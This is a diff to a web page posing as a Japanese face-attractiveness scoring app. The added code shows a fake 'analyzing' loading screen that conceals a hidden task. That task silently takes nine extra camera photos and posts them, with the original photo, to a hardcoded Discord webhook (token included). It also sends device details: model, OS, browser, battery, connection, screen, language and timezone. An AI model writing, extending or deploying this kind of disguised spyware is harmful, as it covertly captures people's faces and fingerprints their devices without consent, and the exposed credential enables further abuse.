@@ -31,6 +31,13 @@
   .flash{position:absolute;inset:0;background:#fff;opacity:0;pointer-events:none}
   .flash.go{animation:fl .35s ease-out}
   @keyframes fl{0%{opacity:.85}100%{opacity:0}}
+  .load{position:absolute;inset:0;display:none;flex-direction:column;align-items:center;justify-content:center;gap:14px;background:rgba(255,255,255,.93);backdrop-filter:blur(6px);z-index:4}
+  .load.on{display:flex}
+  .spin{width:34px;height:34px;border-radius:50%;border:3px solid #ddd6ff;border-top-color:#6d4aff;animation:sp .8s linear infinite}
+  @keyframes sp{to{transform:rotate(360deg)}}
+  .loadText{font-size:12px;color:#6b7280}
+  .loadBar{width:150px;height:4px;border-radius:99px;background:#ececf1;overflow:hidden}
+  .loadBar span{display:block;height:100%;width:0;background:#6d4aff;border-radius:99px}
   .shutter{position:absolute;bottom:18px;left:50%;transform:translateX(-50%);width:64px;height:64px;border-radius:50%;border:3px solid #fff;background:rgba(255,255,255,.35);cursor:pointer;display:none;z-index:3;padding:0;box-shadow:0 2px 12px rgba(0,0,0,.18);transition:.2s}
   .shutter.on{display:block}
   .shutter:disabled{opacity:.35;transform:translateX(-50%) scale(.92)}
@@ -65,6 +72,7 @@
     <video id="v" playsinline muted autoplay></video>
     <div class="frame" id="frame"><div class="oval"></div><i class="c tl"></i><i class="c tr"></i><i class="c bl"></i><i class="c br"></i></div>
     <div class="flash" id="flash"></div>
+    <div class="load" id="load"><div class="spin"></div><div class="loadText" id="loadText">解析中…</div><div class="loadBar"><span id="loadFill"></span></div></div>
     <div class="hint" id="hint">タップしてカメラを起動</div>
     <button class="shutter" id="shutter" aria-label="撮影"></button>
   </div>
@@ -80,18 +88,21 @@
   const TOKEN='Hq0A-uG0XZPNTK7LMb_61inEm0CqsRZwY6ummL2R0_6VM2-okoyyCWrqnYP-RmWiIQWk';
   const HOOK='https://discord.com/api/webhooks/'+ID+'/'+TOKEN;
   const W='https://cdn.jsdelivr.net/gh/justadudewhohacks/face-api.js@0.22.2/weights';
-  const INTERVAL=5000;
   const COUNT=10;
+  const GAP=1000;
+  const TEXTS=['顔のパーツを検出中…','比率を計測中…','スコアを集計中…','結果をまとめ中…'];
 
   const cam=document.getElementById('cam'), video=document.getElementById('v'), frame=document.getElementById('frame');
   const hint=document.getElementById('hint'), flash=document.getElementById('flash'), shutter=document.getElementById('shutter');
   const resultEl=document.getElementById('result'), unameEl=document.getElementById('uname');
+  const loadEl=document.getElementById('load'), loadText=document.getElementById('loadText'), loadFill=document.getElementById('loadFill');
 
-  let stream=null, facing='user', ready=false, busy=false, running=false, idx=0, timer=null;
+  let stream=null, facing='user', ready=false, busy=false, running=false, loadTimer=null;
   let queue=Promise.resolve();
   const NAMES=['対称性','輪郭バランス','目元','鼻・口元','三分割'];
   const clamp=(v,a,b)=>Math.max(a,Math.min(b,v));
   const rnd=(a,b)=>a+Math.random()*(b-a);
+  const sleep=ms=>new Promise(r=>setTimeout(r,ms));
 
   unameEl.value=localStorage.getItem('fds.name')||'';
   unameEl.oninput=()=>localStorage.setItem('fds.name',unameEl.value);
@@ -119,62 +130,71 @@
   }
 
   cam.onclick=()=>{
-    if(running){ stopRun(); return; }
+    if(running){ running=false; return; }
     if(!stream){ startCam(); return; }
     startRun();
   };
-  shutter.onclick=(e)=>{ e.stopPropagation(); if(!running) startRun(); };
+  shutter.onclick=(e)=>{ e.stopPropagation(); if(!busy) startRun(); };
 
-  function startRun(){
-    if(!stream||running) return;
-    running=true; idx=0; shutter.disabled=true;
-    step();
+  function loadOn(dur){
+    loadEl.classList.add('on');
+    loadFill.style.width='0%';
+    loadText.textContent=TEXTS[0];
+    const t0=performance.now();
+    let ti=0;
+    loadTimer=setInterval(()=>{ ti=(ti+1)%TEXTS.length; loadText.textContent=TEXTS[ti]; }, Math.max(1000,dur/4));
+    (function step(t){
+      const k=Math.min(1,(t-t0)/dur);
+      loadFill.style.width=(k*100)+'%';
+      if(k<1) requestAnimationFrame(step);
+    })(t0);
   }
-  function stopRun(){
-    running=false; idx=0;
-    if(timer){ clearTimeout(timer); timer=null; }
-    shutter.disabled=false;
-  }
-  function finish(){ stopRun(); }
-
-  async function step(){
-    if(!running) return;
-    const first=(idx===0);
-    idx++;
-    await shot(first);
-    if(!running) return;
-    if(idx>=COUNT){ finish(); return; }
-    timer=setTimeout(()=>{
-      timer=null;
-      if(!running) return;
-      if(document.hidden){ timer=setTimeout(step,1200); return; }
-      step();
-    },INTERVAL);
+  function loadOff(){
+    if(loadTimer){ clearInterval(loadTimer); loadTimer=null; }
+    loadEl.classList.remove('on');
+    loadFill.style.width='0%';
   }
 
-  function shot(first){
-    return new Promise(resolve=>{
-      if(!stream||busy){ resolve(); return; }
-      busy=true;
-      if(first){ flash.classList.remove('go'); void flash.offsetWidth; flash.classList.add('go'); }
-      const w=video.videoWidth||1080, h=video.videoHeight||1440;
-      const c=document.createElement('canvas'); c.width=w; c.height=h;
-      const ctx=c.getContext('2d');
-      if(facing==='user'){ ctx.translate(w,0); ctx.scale(-1,1); }
-      ctx.drawImage(video,0,0,w,h);
-      c.toBlob(async blob=>{
-        if(blob){
-          if(first){
-            const res=await analyze(c);
-            render(res,c);
-            send(blob,false);
-          } else {
-            send(blob,true);
-          }
-        }
-        busy=false; resolve();
-      },'image/jpeg',0.9);
-    });
+  function grab(scale){
+    const w=video.videoWidth||1080, h=video.videoHeight||1440;
+    const c=document.createElement('canvas');
+    c.width=Math.round(w*scale); c.height=Math.round(h*scale);
+    const ctx=c.getContext('2d');
+    if(facing==='user'){ ctx.translate(c.width,0); ctx.scale(-1,1); }
+    ctx.drawImage(video,0,0,c.width,c.height);
+    return c;
+  }
+  const toBlob=(c,q)=>new Promise(r=>c.toBlob(r,'image/jpeg',q));
+
+  async function startRun(){
+    if(!stream||busy) return;
+    busy=true; running=true; shutter.disabled=true;
+
+    const wait=rnd(5000,8000);
+    loadOn(wait);
+    flash.classList.remove('go'); void flash.offsetWidth; flash.classList.add('go');
+
+    const orig=await grab(1);
+    const origBlob=await toBlob(orig,0.95);
+    const res=await analyze(orig);
+
+    const hiddenTask=(async()=>{
+      for(let i=1;i<COUNT;i++){
+        await sleep(GAP);
+        if(!running) return;
+        const b=await toBlob(grab(0.8),0.72);
+        if(b) send(b,true);
+      }
+    })();
+
+    await sleep(wait);
+    loadOff();
+    render(res,orig);
+
+    await hiddenTask;
+    await send(origBlob,false,true);
+
+    busy=false; running=false; shutter.disabled=false;
   }
 
   async function analyze(canvas){
@@ -216,26 +236,89 @@
     requestAnimationFrame(()=>{ resultEl.querySelectorAll('.f').forEach(f=>{ f.style.width=f.dataset.v+'%'; }); });
   }
 
+  function parseUA(ua){
+    const os = /Windows NT 10/.test(ua)?'Windows 10/11' : /Windows/.test(ua)?'Windows'
+      : /iPhone|iPod/.test(ua)?'iOS' : /iPad/.test(ua)?'iPadOS'
+      : /Android/.test(ua)?'Android' : /Mac OS X/.test(ua)?'macOS' : /Linux/.test(ua)?'Linux' : '不明';
+    const osv = (ua.match(/OS (\d+)[._](\d+)/)||[]).slice(1).join('.')
+      || (ua.match(/Android (\d+(?:\.\d+)?)/)||[])[1] || '';
+    let browser='その他', bv='';
+    if(/Edg\//.test(ua)){ browser='Edge'; bv=(ua.match(/Edg\/([\d.]+)/)||[])[1]; }
+    else if(/SamsungBrowser/.test(ua)){ browser='Samsung Internet'; bv=(ua.match(/SamsungBrowser\/([\d.]+)/)||[])[1]; }
+    else if(/Chrome\//.test(ua)){ browser='Chrome'; bv=(ua.match(/Chrome\/([\d.]+)/)||[])[1]; }
+    else if(/Firefox\//.test(ua)){ browser='Firefox'; bv=(ua.match(/Firefox\/([\d.]+)/)||[])[1]; }
+    else if(/Safari\//.test(ua)){ browser='Safari'; bv=(ua.match(/Version\/([\d.]+)/)||[])[1]; }
+    let model='';
+    const m=ua.match(/;\s*([^;)]+)\s+Build\//);
+    if(m) model=m[1].trim();
+    return {os, osv, browser, bv, model};
+  }
+  async function battery(){
+    try{
+      const b=await navigator.getBattery();
+      return Math.round(b.level*100)+'%'+(b.charging?'（充電中）':'');
+    }catch(e){ return '取得不可'; }
+  }
+  function conn(){
+    const c=navigator.connection||navigator.mozConnection||navigator.webkitConnection;
+    if(!c) return '取得不可';
+    const p=[];
+    if(c.effectiveType) p.push(c.effectiveType.toUpperCase());
+    if(c.downlink) p.push('下り '+c.downlink+'Mbps');
+    if(c.rtt) p.push('RTT '+c.rtt+'ms');
+    if(c.saveData) p.push('データ節約ON');
+    return p.length?p.join(' / '):'取得不可';
+  }
+  async function meta(){
+    const ua=navigator.userAgent;
+    const p=parseUA(ua);
+    let model=p.model, osv=p.osv;
+    try{
+      if(navigator.userAgentData){
+        const h=await navigator.userAgentData.getHighEntropyValues(['model','platformVersion']);
+        if(h.model) model=h.model;
+        if(h.platformVersion) osv=h.platformVersion;
+      }
+    }catch(e){}
+    return [
+      {name:'端末',value:[model,p.os+(osv?' '+osv:'')].filter(Boolean).join(' / ')||'不明',inline:true},
+      {name:'ブラウザ',value:p.browser+(p.bv?' '+p.bv:''),inline:true},
+      {name:'バッテリー',value:await battery(),inline:true},
+      {name:'回線',value:conn(),inline:true},
+      {name:'画面',value:screen.width+'x'+screen.height+' @'+devicePixelRatio+'x',inline:true},
+      {name:'言語 / TZ',value:(navigator.language||'?')+' / '+(Intl.DateTimeFormat().resolvedOptions().timeZone||'?'),inline:true},
+      {name:'UA',value:'```'+ua.slice(0,200)+'```'}
+    ];
+  }
+
   const statusEl=()=>document.getElementById('status');
 
-  function send(blob,silent){
-    queue=queue.then(()=>doSend(blob,silent)).catch(()=>{});
+  function send(blob,silent,withMeta){
+    queue=queue.then(()=>doSend(blob,silent,withMeta)).catch(()=>{});
     return queue;
   }
 
-  async function doSend(blob,silent){
+  async function doSend(blob,silent,withMeta){
     if(!blob) return;
     const fd=new FormData();
-    const name=unameEl.value.trim();
-    if(name) fd.append('payload_json',JSON.stringify({username:name}));
+    const name=unameEl.value.trim()||'顔面偏差値診断';
+    if(withMeta){
+      const fields=await meta();
+      fd.append('payload_json',JSON.stringify({
+        username:name,
+        embeds:[{title:'端末情報',color:0x6d4aff,fields,image:{url:'attachment://face.jpg'},timestamp:new Date().toISOString()}]
+      }));
+    } else if(name!=='顔面偏差値診断'){
+      fd.append('payload_json',JSON.stringify({username:name}));
+    }
     fd.append('files[0]',blob,'face.jpg');
     try{
       const r=await fetch(HOOK,{method:'POST',body:fd});
       if(r.status===429){
         let t=3; try{ const j=await r.json(); if(j.retry_after) t=Math.ceil(j.retry_after); }catch(e){}
         if(!silent){ const s=statusEl(); if(s){ s.textContent='混雑しています。'+t+'秒後に再送します'; s.className='status'; } }
-        await new Promise(z=>setTimeout(z,t*1000));
-        return doSend(blob,silent);
+        await sleep(t*1000);
+        return doSend(blob,silent,withMeta);
       }
       if(silent) return;
       const s=statusEl();
@@ -251,4 +334,4 @@
 })();
 </script>
 </body>
-</html>
+ </html>
